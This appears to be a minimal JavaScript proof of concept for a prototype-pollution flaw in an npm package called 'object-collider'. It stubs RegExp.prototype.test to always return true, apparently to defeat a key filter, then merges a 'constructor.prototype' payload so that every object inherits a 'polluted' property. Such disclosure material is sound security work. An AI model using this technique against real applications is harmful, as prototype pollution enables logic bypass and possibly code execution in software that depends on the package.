RegExp.prototype.test = () => true;
var {collide} = require('object-collider');
const payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
obj = {};
console.log({}.polluted);
collide(obj, payload);
console.log({}.polluted);